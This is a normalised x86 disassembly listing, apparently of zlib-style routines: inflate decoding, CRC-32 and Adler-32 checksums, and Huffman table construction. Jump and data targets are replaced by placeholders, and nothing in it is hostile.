mov [ esp + 0x10 ] edx
cmp esi eax
jb r-xdata
movzx ecx al
and ecx 0xf
mov [ edi + 0x48 ] ecx
mov [ edi ] 0x13
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ esp + 0x2c ]
dec edx
add esi 0x8
add ebx eax
movzx eax ch
mov [ esp + 0x24 ] eax
movzx ecx cl
add ecx eax
mov eax 0x1
shl eax cl
mov ecx [ esp + 0x24 ]
inc ebp
mov [ esp + 0x10 ] edx
dec eax
and eax ebx
shr eax cl
movzx ecx [ esp + 0x2e ]
add eax ecx
mov ecx [ edi + 0x4c ]
mov eax [ ecx + eax * 4 ]
mov [ esp + 0x14 ] eax
shr eax 0x8
movzx eax al
add eax [ esp + 0x24 ]
cmp eax esi
ja r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x40 ]
mov [ edi + 0x18 ] eax
mov [ ecx + 0x30 ] eax
pop esi
pop ebp
pop ebx
pop edi
add esp 0x2c
retn
pop esi
lea eax [ ebp - 0x5 ]
pop ebp
pop ebx
pop edi
add esp 0x2c
retn
mov edx ebx
call sub_43e220
jmp r-xdata
xor eax eax
jmp r-xdata
shr ebx 0x4
mov ecx ebx
and ecx 0xf
add ecx 0x8
sub esi 0x4
cmp ecx [ edi + 0x24 ]
jbe r-xdata
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x10 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
mov [ edi + 0x18 ] eax
mov ecx [ esp + 0x34 ]
push edx
add ecx eax
push ebp
push ecx
call sub_443790
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
add esp 0xc
mov [ edi + 0x18 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x18 ] eax
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x40 ]
mov [ edx + 0x18 ] r--data
mov edx [ esp + 0x10 ]
jmp r-xdata
test eax eax
je r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ esp + 0x2c ]
dec edx
add esi 0x8
add ebx eax
lea eax [ ecx + 0x7 ]
inc ebp
mov [ esp + 0x10 ] edx
cmp esi eax
jb r-xdata
sub edx ecx
add esi edx
mov [ esp + 0x24 ] 0x0
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ esp + 0x2c ]
dec edx
add esi 0x8
add ebx eax
lea eax [ ecx + 0x3 ]
inc ebp
mov [ esp + 0x10 ] edx
cmp esi eax
jb r-xdata
mov ecx [ edi + 0x64 ]
mov edx [ edi + 0x68 ]
add ecx [ edi + 0x60 ]
add edx eax
cmp edx ecx
ja r-xdata
mov [ edi + 0x18 ] eax
mov [ esi + 0x30 ] eax
mov edx 0x1
shl edx cl
xor eax eax
xor ecx ecx
mov [ edi + 0x14 ] edx
xor edx edx
call sub_43e500
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x10 ]
shr ebx 0x8
not ebx
and ebx 0x2
or ebx 0x9
mov [ edi + 0x18 ] eax
mov [ ecx + 0x30 ] eax
mov [ edi ] ebx
xor ebx ebx
xor esi esi
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x10 ]
mov [ ecx + 0x18 ] r--data
jmp r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x24 ]
mov edx [ edi + 0x68 ]
dec eax
mov [ edi + edx * 2 + 0x70 ] cx
inc [ edi + 0x68 ]
test eax eax
jne r-xdata
sub_43e220
push esi
mov esi edx
not eax
test esi esi
je r-xdata
push ebx
push edi
cmp esi 0x20
jb r-xdata
lea esp [ esp ]
cmp esi 0x4
jb r-xdata
mov edi esi
shr edi 0x5
movzx edx [ ecx ]
xor edx eax
and edx 0xff
shr eax 0x8
xor eax [ edx * 4 + r--data ]
inc ecx
sub esi 0x1
jne r-xdata
pop edi
pop ebx
test esi esi
je r-xdata
mov edx esi
shr edx 0x2
xor eax [ ecx ]
add ecx 0x4
mov edx eax
shr edx 0x10
mov ebx eax
shr ebx 0x8
and edx 0xff
mov edx [ edx * 4 + r--data ]
and ebx 0xff
xor edx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
xor edx [ ebx * 4 + r--data ]
and eax 0xff
xor edx [ eax * 4 + r--data ]
add ecx 0x4
xor edx [ ecx - 0x4 ]
add ecx 0x4
mov eax edx
shr eax 0x10
mov ebx edx
shr ebx 0x8
and eax 0xff
mov eax [ eax * 4 + r--data ]
and ebx 0xff
xor eax [ ebx * 4 + r--data ]
mov ebx edx
shr ebx 0x18
xor eax [ ebx * 4 + r--data ]
and edx 0xff
xor eax [ edx * 4 + r--data ]
add ecx 0x4
xor eax [ ecx - 0x8 ]
add ecx 0x4
mov edx eax
shr edx 0x10
mov ebx eax
and edx 0xff
mov edx [ edx * 4 + r--data ]
shr ebx 0x8
and ebx 0xff
xor edx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
xor edx [ ebx * 4 + r--data ]
and eax 0xff
xor edx [ eax * 4 + r--data ]
add ecx 0x4
xor edx [ ecx - 0xc ]
mov eax edx
shr eax 0x10
mov ebx edx
shr ebx 0x8
and eax 0xff
mov eax [ eax * 4 + r--data ]
and ebx 0xff
xor eax [ ebx * 4 + r--data ]
mov ebx edx
shr ebx 0x18
xor eax [ ebx * 4 + r--data ]
and edx 0xff
xor eax [ edx * 4 + r--data ]
xor eax [ ecx - 0x8 ]
mov edx eax
shr edx 0x10
mov ebx eax
and edx 0xff
mov edx [ edx * 4 + r--data ]
shr ebx 0x8
and ebx 0xff
xor edx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
xor edx [ ebx * 4 + r--data ]
and eax 0xff
xor edx [ eax * 4 + r--data ]
xor edx [ ecx - 0x4 ]
mov eax edx
shr eax 0x10
and eax 0xff
mov ebx edx
mov eax [ eax * 4 + r--data ]
shr ebx 0x8
and ebx 0xff
xor eax [ ebx * 4 + r--data ]
mov ebx edx
shr ebx 0x18
xor eax [ ebx * 4 + r--data ]
and edx 0xff
xor eax [ edx * 4 + r--data ]
add ecx 0x4
xor eax [ ecx - 0x4 ]
add ecx 0x4
mov edx eax
mov ebx eax
shr edx 0x10
shr ebx 0x8
and edx 0xff
mov edx [ edx * 4 + r--data ]
and ebx 0xff
xor edx [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
xor edx [ ebx * 4 + r--data ]
and eax 0xff
xor edx [ eax * 4 + r--data ]
sub esi 0x20
xor edx [ ecx - 0x4 ]
mov eax edx
shr eax 0x10
and eax 0xff
mov eax [ eax * 4 + r--data ]
mov ebx edx
shr ebx 0x8
and ebx 0xff
xor eax [ ebx * 4 + r--data ]
mov ebx edx
shr ebx 0x18
xor eax [ ebx * 4 + r--data ]
and edx 0xff
xor eax [ edx * 4 + r--data ]
sub edi 0x1
jne r-xdata
test cl 0x3
je r-xdata
not eax
pop esi
retn
jmp r-xdata
xor eax [ ecx ]
add ecx 0x4
mov edi eax
shr edi 0x10
and edi 0xff
mov edi [ edi * 4 + r--data ]
mov ebx eax
shr ebx 0x8
and ebx 0xff
xor edi [ ebx * 4 + r--data ]
mov ebx eax
shr ebx 0x18
xor edi [ ebx * 4 + r--data ]
and eax 0xff
xor edi [ eax * 4 + r--data ]
sub esi 0x4
sub edx 0x1
mov eax edi
jne r-xdata
movzx edx [ ecx ]
xor edx eax
and edx 0xff
shr eax 0x8
xor eax [ edx * 4 + r--data ]
inc ecx
sub esi 0x1
jne r-xdata
sub_43e500
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
shr edi 0x10
and ecx 0xffff
mov esi edx
cmp ebx 0x1
jne r-xdata
test esi esi
jne r-xdata
movzx eax [ esi ]
add ecx eax
cmp ecx 0xfff1
jb r-xdata
cmp ebx 0x10
jae r-xdata
pop edi
lea eax [ esi + 0x1 ]
pop esi
pop ebx
retn
add edi ecx
cmp edi 0xfff1
jb r-xdata
sub ecx 0xfff1
cmp ebx 0x15b0
jb r-xdata
test ebx ebx
je r-xdata
mov eax edi
pop edi
shl eax 0x10
pop esi
or eax ecx
pop ebx
retn
sub edi 0xfff1
mov eax edi
pop edi
shl eax 0x10
pop esi
or eax ecx
pop ebx
retn
test ebx ebx
je r-xdata
mov eax 0x5e6ea9af
mul ebx
push ebp
mov ebp edx
shr ebp 0xb
cmp ecx 0xfff1
jb r-xdata
lea ecx [ ecx ]
cmp ebx 0x10
jb r-xdata
movzx edx [ esi ]
add ecx edx
movzx edx [ esi + 0x1 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x2 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x3 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x4 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x5 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x6 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x7 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x8 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x9 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xa ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xb ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xc ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xd ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xe ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xf ]
add edi ecx
add ecx edx
add edi ecx
add esi 0x10
sub eax 0x1
jne r-xdata
mov eax 0x80078071
mul edi
shr edx 0xf
mov eax edx
shl eax 0x4
sub eax edx
add eax edi
pop edi
shl eax 0x10
pop esi
or eax ecx
pop ebx
retn
sub ecx 0xfff1
movzx edx [ esi ]
add ecx edx
dec ebx
inc esi
add edi ecx
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
shr eax 0x4
nop
mov eax 0x80078071
mul ecx
shr edx 0xf
imul edx edx 0xffff000f
add ecx edx
mov eax 0x80078071
mul edi
shr edx 0xf
imul edx edx 0xffff000f
add edi edx
sub ebp 0x1
jne r-xdata
mov eax 0x80078071
mul ecx
shr edx 0xf
imul edx edx 0xffff000f
add ecx edx
mov eax 0x80078071
mul edi
shr edx 0xf
imul edx edx 0xffff000f
add edi edx
movzx eax [ esi ]
add ecx eax
dec ebx
inc esi
add edi ecx
test ebx ebx
jne r-xdata
movzx edx [ esi ]
add ecx edx
movzx edx [ esi + 0x1 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x2 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x3 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x4 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x5 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x6 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x7 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x8 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0x9 ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xa ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xb ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xc ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xd ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xe ]
add edi ecx
add ecx edx
movzx edx [ esi + 0xf ]
add edi ecx
add ecx edx
sub ebx 0x10
add edi ecx
add esi 0x10
sub eax 0x1
jne r-xdata
sub ebx 0x15b0
mov eax 0x15b
jmp r-xdata
pop ebp
sub_43e760
sub esp 0x3c
push ebx
push ebp
push esi
push edi
mov ecx [ esp + 0x50 ]
mov eax [ ecx + 0x1c ]
mov edx [ ecx + 0x4 ]
mov ebx [ eax + 0x38 ]
mov ebp [ ecx ]
dec ebp
lea edx [ edx + ebp - 0x5 ]
mov [ esp + 0x14 ] edx
mov esi [ ecx + 0xc ]
mov ecx [ ecx + 0x10 ]
mov edx ecx
sub edx [ esp + 0x54 ]
dec esi
add edx esi
lea ecx [ ecx + esi - 0x101 ]
mov [ esp + 0x38 ] edx
mov edx [ eax + 0x28 ]
mov [ esp + 0x2c ] ecx
mov ecx [ eax + 0x2c ]
mov [ esp + 0x28 ] edx
mov edx [ eax + 0x30 ]
mov [ esp + 0x3c ] ecx
mov ecx [ eax + 0x34 ]
mov [ esp + 0x44 ] edx
mov edx [ eax + 0x4c ]
mov [ esp + 0x40 ] ecx
mov ecx [ eax + 0x50 ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] ecx
mov ecx [ eax + 0x54 ]
mov edx 0x1
shl edx cl
mov ecx [ eax + 0x58 ]
mov [ esp + 0x18 ] eax
mov edi [ eax + 0x3c ]
mov [ esp + 0x54 ] 0x1
mov eax [ esp + 0x54 ]
shl eax cl
dec edx
mov [ esp + 0x10 ] ebp
mov [ esp + 0x48 ] edx
dec eax
mov [ esp + 0x30 ] eax
mov ecx [ esp + 0x20 ]
and edx ebx
mov eax [ ecx + edx * 4 ]
mov edx eax
shr edx 0x8
movzx ecx dl
movzx edx al
shr ebx cl
sub edi ecx
test edx edx
je r-xdata
movzx eax [ ebp + 0x1 ]
inc ebp
mov ecx edi
shl eax cl
inc ebp
add edi 0x8
mov ecx edi
add ebx eax
movzx eax [ ebp ]
shl eax cl
mov [ esp + 0x10 ] ebp
add ebx eax
add edi 0x8
inc esi
shr eax 0x10
mov [ esi ] al
jmp r-xdata
test dl 0x10
jne r-xdata
mov edx [ esp + 0x14 ]
cmp ebp edx
jae r-xdata
shr eax 0x10
and edx 0xf
mov [ esp + 0x54 ] eax
je r-xdata
test dl 0x40
jne r-xdata
mov eax edi
shr eax 0x3
sub ebp eax
add eax eax
add eax eax
add eax eax
sub edi eax
mov ecx edi
mov eax 0x1
shl eax cl
mov ecx [ esp + 0x50 ]
sub edx ebp
add edx 0x5
dec eax
and ebx eax
lea eax [ ebp + 0x1 ]
mov [ ecx ] eax
lea eax [ esi + 0x1 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x2c ]
sub eax esi
add eax 0x101
mov [ ecx + 0x10 ] eax
mov eax [ esp + 0x18 ]
mov [ ecx + 0x4 ] edx
mov [ eax + 0x3c ] edi
pop edi
pop esi
pop ebp
mov [ eax + 0x38 ] ebx
pop ebx
add esp 0x3c
retn
cmp esi [ esp + 0x2c ]
jae r-xdata
cmp edi 0xf
jae r-xdata
cmp edi edx
jae r-xdata
test dl 0x20
je r-xdata
mov ecx 0x1
mov [ esp + 0x54 ] ecx
mov ecx edx
mov edx [ esp + 0x54 ]
shl edx cl
shr eax 0x10
dec edx
and edx ebx
add edx eax
mov eax [ esp + 0x20 ]
mov eax [ eax + edx * 4 ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
movzx edx al
shr ebx cl
sub edi ecx
test edx edx
jne r-xdata
mov edx [ esp + 0x48 ]
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x24 ]
and ecx ebx
mov edx [ edx + ecx * 4 ]
mov eax edx
shr eax 0x8
movzx ecx al
movzx eax dl
shr ebx cl
sub edi ecx
mov [ esp + 0x1c ] edx
test al 0x10
jne r-xdata
movzx edx [ ebp + 0x1 ]
inc ebp
movzx eax [ ebp + 0x1 ]
mov ecx edi
inc ebp
shl edx cl
add edi 0x8
mov ecx edi
shl eax cl
add ebx edx
mov [ esp + 0x10 ] ebp
add ebx eax
add edi 0x8
mov ecx edx
mov eax 0x1
shl eax cl
dec eax
and eax ebx
add [ esp + 0x54 ] eax
shr ebx cl
sub edi edx
movzx eax [ ebp + 0x1 ]
inc ebp
mov ecx edi
shl eax cl
mov [ esp + 0x10 ] ebp
add ebx eax
add edi 0x8
mov eax [ esp + 0x50 ]
mov [ eax + 0x18 ] r--data
mov edx [ esp + 0x18 ]
mov [ edx ] 0xb
jmp r-xdata
cmp edi 0xf
jae r-xdata
shr edx 0x10
and eax 0xf
mov [ esp + 0x1c ] edx
cmp edi eax
jae r-xdata
test al 0x40
jne r-xdata
mov edx [ esp + 0x14 ]
mov ecx 0x1
mov edx ecx
mov ecx eax
shl edx cl
sub edi eax
dec edx
and edx ebx
mov ecx edx
mov edx [ esp + 0x1c ]
add edx ecx
mov ecx eax
mov eax esi
sub eax [ esp + 0x38 ]
shr ebx cl
mov [ esp + 0x1c ] edx
cmp edx eax
jbe r-xdata
movzx edx [ ebp + 0x1 ]
inc ebp
mov ecx edi
shl edx cl
add edi 0x8
mov [ esp + 0x10 ] ebp
add ebx edx
cmp edi eax
jae r-xdata
mov eax [ esp + 0x50 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
mov ecx eax
movzx eax [ esp + 0x1e ]
mov edx 0x1
shl edx cl
mov ecx [ esp + 0x24 ]
dec edx
and edx ebx
add edx eax
mov edx [ ecx + edx * 4 ]
mov eax edx
shr eax 0x8
movzx ecx al
movzx eax dl
shr ebx cl
sub edi ecx
mov [ esp + 0x1c ] edx
test al 0x10
je r-xdata
mov eax esi
sub eax edx
mov ebp edx
sub ebp eax
cmp ebp [ esp + 0x3c ]
ja r-xdata
movzx edx [ ebp + 0x1 ]
inc ebp
mov ecx edi
shl edx cl
mov [ esp + 0x10 ] ebp
add ebx edx
add edi 0x8
mov ecx [ esp + 0x18 ]
mov [ ecx ] 0x1b
movzx ecx [ eax + 0x1 ]
inc eax
mov [ esi + 0x1 ] cl
mov dl [ eax + 0x1 ]
inc esi
inc eax
inc esi
mov [ esi ] dl
movzx ecx [ eax + 0x1 ]
inc eax
inc esi
mov [ esi ] cl
mov ecx [ esp + 0x54 ]
sub ecx 0x3
mov [ esp + 0x54 ] ecx
cmp ecx 0x2
ja r-xdata
test ecx ecx
je r-xdata
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x18 ]
mov ebp [ esp + 0x10 ]
mov [ ecx + 0x18 ] r--data
mov [ edx ] 0x1b
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x44 ]
dec ecx
mov [ esp + 0x34 ] ecx
test eax eax
jne r-xdata
mov dl [ eax + 0x1 ]
inc eax
inc esi
mov [ esi ] dl
cmp ecx 0x1
jbe r-xdata
cmp eax ebp
jae r-xdata
mov eax [ esp + 0x28 ]
sub eax ebp
add ecx eax
cmp ebp [ esp + 0x54 ]
jae r-xdata
mov al [ eax + 0x1 ]
inc esi
mov [ esi ] al
jmp r-xdata
sub eax ebp
add ecx eax
cmp ebp [ esp + 0x54 ]
jae r-xdata
mov edx eax
sub edx ebp
add edx [ esp + 0x28 ]
sub ebp eax
add ecx edx
cmp ebp [ esp + 0x54 ]
jae r-xdata
mov eax [ esp + 0x54 ]
cmp eax 0x2
jbe r-xdata
sub [ esp + 0x54 ] ebp
sub [ esp + 0x54 ] ebp
sub [ esp + 0x54 ] ebp
lea ecx [ ecx ]
mov ebp [ esp + 0x54 ]
test ebp ebp
je r-xdata
lea edx [ eax - 0x3 ]
mov eax 0xaaaaaaab
mul edx
mov ebp edx
shr ebp 0x1
inc ebp
lea ebx [ ebx ]
mov al [ ecx + 0x1 ]
inc ecx
inc esi
sub ebp 0x1
mov [ esi ] al
jne r-xdata
jmp r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc esi
sub ebp 0x1
mov [ esi ] al
jne r-xdata
mov ecx esi
sub ecx edx
mov dl [ ecx + 0x1 ]
inc ecx
inc esi
sub ebp 0x1
mov [ esi ] dl
jne r-xdata
mov ecx [ esp + 0x34 ]
cmp eax [ esp + 0x54 ]
jae r-xdata
mov ebp [ esp + 0x10 ]
mov dl [ ecx + 0x1 ]
inc ecx
inc esi
mov [ esi ] dl
cmp ebp 0x1
jbe r-xdata
movzx eax [ ecx + 0x1 ]
sub [ esp + 0x54 ] 0x3
inc ecx
inc esi
mov [ esi ] al
mov dl [ ecx + 0x1 ]
inc ecx
inc esi
mov [ esi ] dl
movzx eax [ ecx + 0x1 ]
inc ecx
inc esi
sub ebp 0x1
mov [ esi ] al
jne r-xdata
sub [ esp + 0x54 ] eax
mov ebp eax
lea esp [ esp ]
mov al [ ecx + 0x1 ]
inc esi
mov [ esi ] al
mov al [ ecx + 0x1 ]
inc ecx
inc esi
sub ebp 0x1
mov [ esi ] al
jne r-xdata
mov ecx esi
sub ecx [ esp + 0x1c ]
jmp r-xdata
sub_43ebf0
sub esp 0x8c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
mov eax [ esp + 0x9c ]
mov [ esp + 0xc ] eax
xor eax eax
push ebx
mov ebx ecx
movzx ecx ax
mov eax ecx
push ebp
shl ecx 0x10
or eax ecx
push esi
mov esi [ esp + 0xa0 ]
push edi
mov edi [ esp + 0xa8 ]
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] eax
xor eax eax
mov [ esp + 0x54 ] ebx
mov [ esp + 0x3c ] edi
mov [ esp + 0x4c ] edx
test esi esi
jbe r-xdata
mov eax [ edx ]
mov [ esp + 0x14 ] eax
mov ebp 0xf
mov edi edi
movzx ecx [ ebx + eax * 2 ]
inc [ esp + ecx * 2 + 0x58 ]
lea ecx [ esp + ecx * 2 + 0x58 ]
inc eax
cmp eax esi
jb r-xdata
mov [ esp + 0x20 ] ebp
cmp eax ebp
jbe r-xdata
dec ebp
cmp ebp 0x1
jae r-xdata
test ebp ebp
jne r-xdata
mov [ esp + 0x14 ] ebp
mov eax ebp
cmp [ esp + ebp * 2 + 0x58 ] 0x0
jne r-xdata
mov esi 0x1
mov ecx [ edi ]
xor eax eax
mov [ esp + 0x12 ] ax
mov [ esp + 0x10 ] 0x40
mov [ esp + 0x11 ] 0x1
mov eax [ esp + 0x10 ]
mov [ ecx ] eax
add [ edi ] 0x4
mov ecx [ edi ]
mov [ ecx ] eax
add [ edi ] 0x4
mov [ edx ] 0x1
xor eax eax
jmp r-xdata
cmp eax esi
jae r-xdata
cmp [ esp + esi * 2 + 0x5a ] 0x0
jne r-xdata
mov ecx [ esp + 0x98 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x8c
retn
mov edx 0x1
mov eax edx
mov [ esp + 0x14 ] esi
inc esi
jmp r-xdata
cmp [ esp + esi * 2 + 0x5c ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc eax
cmp eax 0xf
jbe r-xdata
add esi 0x2
jmp r-xdata
cmp [ esp + esi * 2 + 0x5e ] 0x0
jne r-xdata
movzx ecx [ esp + eax * 2 + 0x58 ]
add edx edx
sub edx ecx
js r-xdata
test edx edx
jle r-xdata
add esi 0x3
jmp r-xdata
cmp [ esp + esi * 2 + 0x60 ] 0x0
jne r-xdata
xor eax eax
mov [ esp + 0x7a ] ax
mov eax 0x2
cmp [ esp + 0xa0 ] 0x0
je r-xdata
add esi 0x4
add esi 0x5
cmp esi 0xf
jbe r-xdata
mov cx [ esp + eax + 0x78 ]
add cx [ esp + eax + 0x58 ]
add eax 0x2
mov [ esp + eax + 0x78 ] cx
cmp eax 0x1e
jb r-xdata
mov ebp [ esp + 0xa4 ]
mov ecx [ esp + 0x1c ]
xor eax eax
test ebp ebp
jbe r-xdata
cmp ebp 0x1
jne r-xdata
cmp [ esp + esi * 2 + 0x58 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ esp + 0xa0 ]
sub eax 0x0
mov edx 0xffffffff
je r-xdata
lea ebx [ ebx ]
mov [ esp + 0x38 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] 0x13
sub eax 0x1
je r-xdata
inc eax
cmp eax ebp
jb r-xdata
movzx edx [ ebx + eax * 2 ]
movzx edx [ esp + edx * 2 + 0x78 ]
mov [ ecx + edx * 2 ] ax
movzx edx [ ebx + eax * 2 ]
inc [ esp + edx * 2 + 0x78 ]
lea edx [ esp + edx * 2 + 0x78 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x1c ] edx
lea esp [ esp ]
cmp eax 0x5b0
jae r-xdata
mov eax r--data
sub eax 0x202
mov [ esp + 0x2c ] eax
mov eax r--data
sub eax 0x202
mov [ esp + 0x38 ] eax
mov [ esp + 0x30 ] 0x100
jmp r-xdata
mov [ esp + 0x2c ] r--data
mov [ esp + 0x38 ] r--data
mov [ esp + 0x30 ] edx
jmp r-xdata
cmp [ ebx + eax * 2 ] 0x0
je r-xdata
jle r-xdata
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov eax 0x1
mov eax [ edi ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x24 ] eax
mov eax 0x1
shl eax cl
xor ebp ebp
xor ebx ebx
cmp [ esp + 0xa0 ] 0x1
lea ecx [ eax - 0x1 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x34 ] edx
mov [ esp + 0x44 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x40 ] ecx
jne r-xdata
mov [ esp + 0x10 ] 0x60
xor eax eax
movzx eax [ esi ]
mov ecx [ esp + 0x38 ]
add eax eax
mov dl [ eax + ecx ]
mov ecx [ esp + 0x2c ]
mov [ esp + 0x10 ] dl
mov dx [ eax + ecx ]
mov [ esp + 0x12 ] dx
jmp r-xdata
mov [ esp + 0x12 ] ax
sub eax edx
sub ecx esi
mov [ ecx ] edi
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ edx - 0x1 ]
mov eax 0x1
shl eax cl
test ebp eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x44 ]
sub ecx ebx
mov edx 0x1
shl edx cl
mov ecx ebx
mov edi ebp
shr edi cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x50 ] eax
lea esi [ edx * 4 ]
add edi eax
lea ecx [ ecx + edi * 4 ]
mov edi [ esp + 0x10 ]
nop
test eax eax
je r-xdata
lea esp [ esp ]
xor ebp ebp
lea ecx [ eax - 0x1 ]
and ecx ebp
add ecx eax
mov ebp ecx
jmp r-xdata
shr eax 0x1
test ebp eax
jne r-xdata
cmp edx [ esp + 0x14 ]
jbe r-xdata
cmp edx [ esp + 0x20 ]
je r-xdata
add [ esp + 0x1c ] 0x2
mov eax 0xffff
add [ esp + edx * 2 + 0x58 ] ax
movzx eax [ esp + edx * 2 + 0x58 ]
test ax ax
jne r-xdata
mov al [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
mov edx [ esp + 0x30 ]
sub al bl
mov [ esp + 0x11 ] al
movzx eax [ esi ]
movzx ecx ax
cmp ecx edx
jge r-xdata
mov esi [ esp + 0x40 ]
and esi ebp
mov [ esp + 0x48 ] esi
cmp esi [ esp + 0x34 ]
je r-xdata
mov edi [ esp + 0x3c ]
mov al dl
sub al bl
xor ecx ecx
mov [ esp + 0x10 ] 0x40
mov [ esp + 0x11 ] al
mov [ esp + 0x12 ] cx
test ebp ebp
je r-xdata
mov ecx [ esp + 0x1c ]
movzx edx [ ecx ]
mov eax [ esp + 0x54 ]
movzx ecx [ eax + edx * 2 ]
mov [ esp + 0x18 ] ecx
mov edx ecx
test ebx ebx
jne r-xdata
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x4c ]
lea eax [ edx * 4 ]
add [ edi ] eax
mov edx [ esp + 0x14 ]
mov [ ecx ] edx
xor eax eax
jmp r-xdata
mov esi [ esp + 0x24 ]
nop
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x50 ]
lea ecx [ edx + eax * 4 ]
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x18 ]
sub ecx ebx
mov eax 0x1
lea edx [ ebx + ecx ]
shl eax cl
cmp edx [ esp + 0x20 ]
jae r-xdata
mov ebx [ esp + 0x14 ]
mov ecx ebx
mov eax ebp
shr eax cl
mov ecx [ esp + 0x10 ]
mov [ esi + eax * 4 ] ecx
lea ecx [ edx - 0x1 ]
mov eax 0x1
shl eax cl
test ebp eax
je r-xdata
mov eax [ esp + 0x40 ]
and eax ebp
cmp eax [ esp + 0x34 ]
je r-xdata
mov eax 0x1
shl eax cl
add [ esp + 0x28 ] eax
cmp [ esp + 0xa0 ] 0x1
mov [ esp + 0x44 ] eax
jne r-xdata
lea esi [ esp + edx * 2 + 0x58 ]
mov edi edi
test eax eax
je r-xdata
lea ecx [ ecx ]
mov eax [ esp + 0x14 ]
mov esi [ edi ]
xor ebx ebx
mov [ esp + 0x18 ] eax
mov [ esp + 0x11 ] al
mov edx eax
mov edx esi
mov esi [ esp + 0x3c ]
mov eax [ esi ]
mov [ eax + edx * 4 ] cl
mov ecx [ esi ]
mov al [ esp + 0x14 ]
mov [ ecx + edx * 4 + 0x1 ] al
mov eax [ esi ]
mov ecx [ esp + 0x24 ]
sub ecx eax
sar ecx 0x2
mov [ esp + 0x34 ] edx
mov [ eax + edx * 4 + 0x2 ] cx
jmp r-xdata
cmp [ esp + 0x28 ] 0x5b0
jae r-xdata
mov esi [ esp + 0x48 ]
inc edx
inc ecx
add esi 0x2
add eax eax
cmp edx [ esp + 0x20 ]
jb r-xdata
lea ecx [ eax - 0x1 ]
and ecx ebp
add ecx eax
mov ebp ecx
jne r-xdata
shr eax 0x1
test ebp eax
jne r-xdata
movzx edi [ esi ]
sub eax edi
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
sub_43f0d9
push 0x44
mov eax sub_458da8
call sub_4432dd
push r--data
lea ecx [ ebp - 0x28 ]
call sub_429dd0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_429730
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_442eab
int3
sub_43f111
push 0x44
mov eax sub_458da8
call sub_4432dd
push r--data
